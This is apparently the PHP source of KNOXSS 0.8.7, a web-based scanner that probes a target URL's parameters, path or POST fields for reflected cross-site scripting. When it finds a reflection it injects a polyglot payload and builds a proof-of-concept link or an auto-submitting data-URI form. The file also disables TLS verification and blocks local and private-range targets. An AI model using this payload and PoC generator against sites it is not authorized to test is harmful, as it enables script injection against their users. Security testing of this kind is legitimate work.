<?php
error_reporting(0); // Turn off all error reporting
?>
<!DOCTYPE html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KNOXSS Standard</title>
<link rel="stylesheet" href="styles.css">
</head>
<body id="body">
<h1 id="knoxss">KNOXSS</h1>
<div id="div_target">
<p id="info">KNOXSS 0.8.7 <b class="error">beta</b></p>
<form action="" method="POST">
<input type="url" id="target" name="target" placeholder="Target Page">
<input type="submit" name="submit" id="submit" value="Test">
<textarea type="text" class="extra" id="post" name="post" rows="1" cols="80" placeholder="POST data (optional)"></textarea>
<textarea type="text" class="extra" name="auth" rows="2" cols="80" placeholder="Auth Headers (optional)"></textarea>
<input type="radio" class="mode" id="default" name="mode" value="0" checked>
<label for="default">default</label>
</form>
<br>
<?php
/*error_reporting(E_ALL);
ini_set('display_errors',1);*/

// ===== VARS ===== //

$probe = "KNOX1S2S3";
$xss = 0;
$tester_url = "http://localhost:1337";
$demo = "<!'/*!\"/*!\'/*\\\"/*--!></Title/</Script/><Input/Autofocus/%0D*/Onfocus=confirm`1`//><svg>";
$input = $_REQUEST["target"];
$target = $input;
$auth = $_REQUEST["auth"];
$httpHeaders = explode("\r\n", $auth);
$die = "\n</div>\n<div class=\"div_footer\" id=\"div_footer\">\n<p class=\"copyright\" id=\"copyright\">
	© 2016 Brute Logic - All rights reserved.</p>\n</div>\n</body>\n</html>\n<!--" . htmlentities($input) . "-->";
$preflight = 0;
$post_data = $_REQUEST["post"];
$http_method = 0;

if(strpos($target,"#")) {
   $fragment = preg_replace("/.*#/","#",$target);
} else { $fragment = "#KNOXSS"; }
//$fragment = "data:text/html,'/*\"/*><img src=. */onerror=alert(1)//>";

// ===== FUNCTIONS ===== //

function test($url, $http_method, $header, $data){

   global $preflight, $die, $httpHeaders;

   $optArray = array(
      CURLOPT_URL => $url,
      CURLOPT_POST => $http_method,
      CURLOPT_HEADER => $header,
      CURLOPT_HTTPHEADER => $httpHeaders,
      CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
      CURLOPT_CONNECTTIMEOUT => 30,
      CURLOPT_TIMEOUT => 30,
      CURLOPT_FOLLOWLOCATION => 1,
      CURLOPT_RETURNTRANSFER => 1,
	  CURLOPT_SSL_VERIFYPEER => 0,
	  CURLOPT_SSL_VERIFYHOST => 0
   );
   $ch = curl_init();
   curl_setopt_array($ch, $optArray);
   if ($data) { curl_setopt($ch, CURLOPT_POSTFIELDS, $data); }

   $response = curl_exec($ch) or die("\n<br>\n<p id=\"info\" class=\"error\">ERROR: Aborted, network issues!" . 
					"\n<br>Reason: " . curl_error($ch) . ".</p>" . $die);

   curl_close($ch);
   return $response;
}

function headers($auth) {

   $chunks = array_chunk(preg_split("/(:|\r\n)/", $auth), 2);
   $result = array_combine(array_column($chunks, 0), array_column($chunks, 1));
   return json_encode($result);
}

function test_reflection($url, $http_method, $send_data, $parameter) {

   global $msg, $probe;

   $r = test($url, $http_method, 1, $send_data);

   if (preg_match("/<noscript>.*javascript.*<\/noscript>/i", $r)) {
      return 1;
   }

   preg_match_all("/$probe/i", $r, $matches);
   if ($matches[0]) {

	 echo "<p id=\"info\">" . sizeof($matches[0]) . " raw reflection(s) found in <i>" . htmlentities($parameter) . ".</i>\n";
	 return 1;

   } else {

        if ($send_data) {
           $r = test($url, $http_method, 1, str_replace($probe, "'\"".$probe, $send_data));
        } else {
           $r = test(str_replace($probe, "'\"".$probe, $url), $http_method, 1, $send_data);
        }
        preg_match_all("/$probe/i", $r, $matches);

        if ($matches[0]) {
           echo "<p id=\"info\">" . sizeof($matches[0]) . " raw reflection(s) found in <i>" . htmlentities($parameter) . ".</i>\n";
           return 1;
        }

   }

}

function pwn($pwn) {

   $pwn = str_replace("\\", "\\\\", str_ireplace("</script", "%3C/script", $pwn));
   $pwn = str_replace("'", "%27", str_replace("%25%75", "%u", $pwn));
   echo "\n<script>window.open('".$pwn."', '', 'top=90, left=260, width=900, height=600');</script>\n";
}

function set($type, $mode, $tester_url, $target) {

   global $demo, $fragment, $auth, $xss, $probe, $post_data, $send_data;

   $p = $demo;

   $xss_data = str_replace($probe, $p, $send_data);

   $target_test = "{\"target\":" . json_encode(str_replace($probe, $p, $target) . $fragment) . 
			", \"headers\":". headers($auth) . ", \"data\":" . json_encode($xss_data) . "}";

   if(!$post_data){
      $target_open = str_replace($probe, $p, $target) . $fragment;
   } else {
      $target_open = post_poc($target, $xss_data);
   }

   $response = test($tester_url, 1, 0, $target_test);
   if ($response === "TRUE\n") {
      $xss = 2;
      echo "</p>";
      pwn($target_open);
      return $target_open;
   }
   echo "</p>";
}

function test_path($target) {

   global $probe;

   $target = $target . "/";

   $path_levels = explode("/", $target);

   for($i=count($path_levels)-1; $i>=3; $i--) {

      if (preg_match("/\./", $path_levels[$i])) {
         $path_replace = $path_levels[$i] . "/";
      } else { $path_replace = $path_levels[$i]; }

      if(!$path_levels[$i]) {
         $target_sliced[] = $target . $probe;
      } else {
         $target_sliced[] = str_replace("/".$path_levels[$i]."/", "/".$path_replace.$probe."/", $target);
      }

   }

   return $target_sliced;
}

function xss_page() {

   $method = rand(0,1);
   $xsspage = "https://brutelogic.com.br/xss.php";
   $xsspage_params = ["", "?a=1", "?b1=1", "?b2=1", "?b3=1", "?b4=1",
                        "?c1=1", "?c2=1", "?c3=1", "?c4=1", "?c5=1", "?c6=1"];
   if ($method == 0) {
      $xsspage_target[0] = $xsspage . $xsspage_params[rand(0, count($xsspage_params)-1)];
   } else {
      $xsspage_target[0] = $xsspage;
      $xsspage_target[1] = str_replace("?", "", $xsspage_params[rand(0, count($xsspage_params)-1)]);
   }

   return $xsspage_target;
}

function sanitize_local() {

   global $input;

   $localhost = ["localhost", "127.0", "192.168", "10.0", "0", "\[", "knoxss.me", "104.236.100.235", "1760322795"];
   foreach($localhost as $forbidden) {
      $input = preg_match("/^http(s)?:\/\/$forbidden/i", $input) ? "" : $input;
   }
   $input = preg_match("/\.localhost/i", $input) ? "" : $input;
   $input = preg_match("/^file/", $input) ? "" : $input;
}

function test_post() {

   global $post_data, $tester_url, $mode, $target, $probe, $send_data, $poc, $xss;

   $http_method = 1;
   $a = explode("&", $post_data);

   for ($i=0;$i<count($a);$i++){
      $a[$i] = $a[$i] . $probe;

      $send_data = implode("&", $a);

      $type = test_reflection($target, $http_method, $send_data, explode("=", $a[$i])[0]);

      if ($type == 1) {

         $poc = set($type, $mode, $tester_url, $target);
         if ($poc) {
            $query_less = 1;
            break;
          }
      }

      $xss = 1;
      $a = explode("&", $post_data);
   }
   return $xss;

}

function post_poc($target, $send_data) {

   $data_header = "Data:Text/Html;Base64,";
   $data_begin = "<form action=" . $target . " method=\"POST\">";
   $data_end = "<input type=submit></form><script>document.forms[0].submit()</script>";

   $send_data = explode("&", $send_data);

   for($i=0; $i<count($send_data); $i++) {
      $name_value = explode("=", $send_data[$i], 2);
      $data_input = $data_input . "<input type=hidden name=\"" . $name_value[0] . "\" value=\"" . htmlentities($name_value[1]) . "\">";
   }
   return $data_poc = $data_header . base64_encode($data_begin . $data_input . $data_end);
}


// ===== MAIN ===== //

fsockopen("localhost", 1337) or die("<p id=\"info\" class=\"error\">ERROR: Service DOWN (unable to connect to tester module)!</p>" . $die);

sanitize_local();

if ($input) {

   echo "<p id=\"info\">TARGET: " . htmlentities($target) . "</p>";

   if (!$post_data) {
      $r = test($target);
   } else {
      $r = test($target, 1, 0, $post_data); 
   }

   $preflight = 1;

   do {

      if (!$post_data) {

         $parts = parse_url($target);

         if ($parts["query"]) {
            $a = explode("&", $parts["query"]);
         } else {
            $a = test_path($target);
            array_unshift($a, $target.$probe);
            $query_less = 1;
         }

         for ($i=0;$i<count($a);$i++) {

            if ($parts["query"]){
               $a[$i] = $a[$i] . $probe;
               $target_test = preg_replace("/\?.*/", "?", $target).implode("&", $a);
            } else {
               $target_test = $a[$i];
            }

            $type = test_reflection($target_test, $http_method, $send_data, ( $parts["query"] ? explode("=", $a[$i])[0] : "path of URL") );

            if ($type == 1) {
               $poc = set($type, $mode, $tester_url, $target_test);
               if ($poc) {
	          $query_less = 1;
	          break;
	       }
            }

            $xss = 1;

            if($parts["query"]) {
               $a = explode("&", $parts["query"]);
            }

         }

      } else { test_post(); $query_less = 1; }

      if ($xss != 0) {

         if ($xss == 1) {
            if ($query_less == 1) {
	       echo "<br>\n";
               echo "<p id=\"info\">No XSS found for <i>" . htmlentities($input) . "</i></p>\n";
            }
         } else {
            echo "<br>\n";
            echo "<p id=\"info\">XSS found " . $msg . " for <b>" . htmlentities($target) . "</b><p>\n";
            $poc = htmlentities($poc);
            echo "<p id=\"info\" class=\"found\"><a href=\"" . $poc . "\" target=\"_blank\">" . $poc  . "</a></p>\n";
         }

      }

      $target = preg_replace("/\?.*/", "", $target);

   } while ( $query_less != 1 );

} else {

   if (!$_REQUEST["submit"]){
      echo "<p id=\"info\">Enter a target to test (or hit the button).</p>\n";
   } else {
      echo "<p id=\"info\">Loaded default target for testing KNOXSS capabilities.</p>\n";
      $auto_complete = xss_page();
      echo "<script>\ndocument.getElementById('target').value='" . $auto_complete[0] .
	   "';\ndocument.getElementById('post').value='" . $auto_complete[1] . "';\n</script>\n";
   }
}
?>
</div>
<div class="div_footer" id="div_footer">
<p class="copyright" id="copyright">© 2016 Brute Logic - All rights reserved.</p>
</div>
</body>
</html>
<!--<?=htmlentities($input);?>-->
